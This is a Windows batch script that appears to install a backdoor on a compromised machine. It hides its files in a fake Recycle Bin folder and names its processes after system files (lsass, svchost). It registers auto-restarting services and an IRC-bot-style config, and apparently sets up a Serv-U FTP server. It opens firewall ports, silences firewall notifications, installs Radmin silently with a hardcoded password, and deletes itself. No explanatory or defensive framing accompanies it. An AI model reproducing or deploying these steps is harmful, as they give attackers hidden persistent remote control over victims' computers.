rem @echo off
cd C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin

echo user_nick [YaT]-BXX-[%random%]>> lsass.dll
echo uploaddir C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin>> lsass.dll
echo filedir C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin>> lsass.dll

echo [settings] > svchost.ini
echo ServiceName = Svchost >> svchost.ini
echo ProcCount = 3 >> svchost.ini
echo CheckProcess = 1 >> svchost.ini

echo [Process0] >> svchost.ini
echo CommandLine = C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\lsass.exe lsass.dll >> svchost.ini
echo WorkingDir =  C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\ >> svchost.ini
echo PauseStart = 1000 >> svchost.ini
echo PauseEnd = 1000 >> svchost.ini
echo UserInterface = no >> svchost.ini
echo Restart = Yes >> svchost.ini

echo [Process1] >> svchost.ini
echo CommandLine = C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\services.exe >> svchost.ini
echo WorkingDir =  C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\ >> svchost.ini
echo PauseStart = 1000 >> svchost.ini
echo PauseEnd = 1000 >> svchost.ini
echo UserInterface = no >> svchost.ini
echo Restart = Yes >> svchost.ini

echo [Process2] >> svchost.ini
echo CommandLine = C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\reg.bat >> svchost.ini
echo WorkingDir =  C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\ >> svchost.ini
echo PauseStart = 1000 >> svchost.ini
echo PauseEnd = 1000 >> svchost.ini
echo UserInterface = no >> svchost.ini
echo Restart = Yes >> svchost.ini
svchost -i
net start svchost

cd C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\NetworkConnect\Parameters\Application=m:C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\lsass.exe
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\NetworkConnect\Parameters\AppParameters=m:C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\lsass.dll
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\NetworkSecure\Parameters\Application=m:C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\services.exe
REG.EXE add HKLM\SYSTEM\CurrentControlSet\Services\NetworkSecure\Parameters\AppParameters=m:C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\ServUDaemon.ini

attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000 +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\ +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\tar.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\boot.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\cygcrypt-0.dll +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\cygwin1.dll +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\info.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\JAcheck.ini +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\JAcheck.dll +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\lsass.bat +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\lsass.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\lsass.dll +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\refresh.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\reg.bat +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\reg.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\reg.dll +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\services.bat +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\services.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\ServUDaemon.ini +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\svchost.exe +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\svchost.ini +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\svchost.log +h +s /S /D
attrib C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\syscfg.dll +h +s /S /D


netsh.exe firewall set portopening tcp 9337 services enable all
netsh.exe firewall set portopening tcp 1024 lsass enable all
netsh.exe firewall set notifications disable
netsh.exe firewall set allowedprogram C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\services.exe
netsh.exe firewall set allowedprogram C:\RECYCLED\S-1-5-21-746137067-1229272821-839522115-5000\bin\lsass.exe
quit netsh

goto END

:END

C:\progra~1\radmin\r_server.exe /pass:N0mor3 /port:4899 /silence /save
C:\windows\system32\r_server.exe /pass:N0mor3 /port:4899 /silence /save
C:\winnt\system32\r_server.exe /pass:N0mor3 /port:4899 /silence /save

cd C:\

del RD.bat

